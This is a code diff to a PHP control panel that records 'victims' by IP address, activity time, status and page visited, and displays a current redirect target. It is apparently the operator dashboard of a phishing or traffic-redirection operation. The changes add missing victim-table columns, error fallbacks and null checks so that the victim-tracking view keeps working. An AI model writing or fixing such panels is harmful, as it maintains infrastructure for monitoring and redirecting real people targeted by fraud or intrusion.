@@ -119,7 +119,7 @@ try {
     error_log("Column check error: " . $e->getMessage());
 }
 
-// Create victims table if not exists
+// Create victims table if not exists - COMPLETE VERSION
 $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
     id SERIAL PRIMARY KEY,
     ip_address VARCHAR(45) NOT NULL,
@@ -132,6 +132,27 @@ $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )";
 $db->exec($create_victims_table);
+
+// FIX: Ensure ALL columns exist in victims table
+try {
+    $columns_to_check = ['last_activity', 'status', 'page_visited'];
+    foreach ($columns_to_check as $column) {
+        $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'victims' AND column_name = '$column'");
+        if ($check_column->rowCount() == 0) {
+            if ($column == 'last_activity') {
+                $alter_table = "ALTER TABLE victims ADD COLUMN last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
+            } elseif ($column == 'status') {
+                $alter_table = "ALTER TABLE victims ADD COLUMN status VARCHAR(20) DEFAULT 'active'";
+            } elseif ($column == 'page_visited') {
+                $alter_table = "ALTER TABLE victims ADD COLUMN page_visited VARCHAR(255) DEFAULT 'index.php'";
+            }
+            $db->exec($alter_table);
+            error_log("Added $column column to victims table");
+        }
+    }
+} catch (Exception $e) {
+    error_log("Victims table column check error: " . $e->getMessage());
+}
 
 // Get current redirect - FIXED VERSION
 try {
@@ -146,18 +167,29 @@ try {
 }
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
 
-// Get active victims (last 30 minutes)
-$active_victims_query = "SELECT * FROM victims 
-                        WHERE last_activity > NOW() - INTERVAL '30 minutes' 
-                        AND status = 'active'
-                        ORDER BY last_activity DESC";
-$active_victims_stmt = $db->query($active_victims_query);
-$active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+// Get active victims (last 30 minutes) - FIXED VERSION
+try {
+    $active_victims_query = "SELECT * FROM victims 
+                            WHERE last_activity > NOW() - INTERVAL '30 minutes' 
+                            AND status = 'active'
+                            ORDER BY last_activity DESC";
+    $active_victims_stmt = $db->query($active_victims_query);
+    $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+} catch (PDOException $e) {
+    // If last_activity column doesn't exist yet, get all active victims
+    $active_victims_query = "SELECT * FROM victims WHERE status = 'active' ORDER BY created_at DESC";
+    $active_victims_stmt = $db->query($active_victims_query);
+    $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+}
 
 // Get total victims count
-$total_victims_query = "SELECT COUNT(*) as total FROM victims";
-$total_victims_stmt = $db->query($total_victims_query);
-$total_victims = $total_victims_stmt->fetch(PDO::FETCH_ASSOC)['total'];
+try {
+    $total_victims_query = "SELECT COUNT(*) as total FROM victims";
+    $total_victims_stmt = $db->query($total_victims_query);
+    $total_victims = $total_victims_stmt->fetch(PDO::FETCH_ASSOC)['total'];
+} catch (PDOException $e) {
+    $total_victims = 0;
+}
 
 // Handle messages from session
 if (isset($_SESSION['success_message'])) {
@@ -408,14 +440,18 @@ if (isset($_SESSION['error_message'])) {
                                     </td>
                                     <td>
                                         <?php 
-                                        $last_activity = strtotime($victim['last_activity']);
-                                        $time_diff = time() - $last_activity;
-                                        echo date('H:i:s', $last_activity);
-                                        echo '<br><small>' . floor($time_diff / 60) . ' min ago</small>';
+                                        if (isset($victim['last_activity'])) {
+                                            $last_activity = strtotime($victim['last_activity']);
+                                            $time_diff = time() - $last_activity;
+                                            echo date('H:i:s', $last_activity);
+                                            echo '<br><small>' . floor($time_diff / 60) . ' min ago</small>';
+                                        } else {
+                                            echo 'Unknown';
+                                        }
                                         ?>
                                     </td>
                                     <td>
-                                        <span class="badge info"><?php echo htmlspecialchars($victim['page_visited']); ?></span>
+                                        <span class="badge info"><?php echo htmlspecialchars($victim['page_visited'] ?? 'index.php'); ?></span>
                                     </td>
                                     <td>
                                         <form method="POST" style="display: inline;">
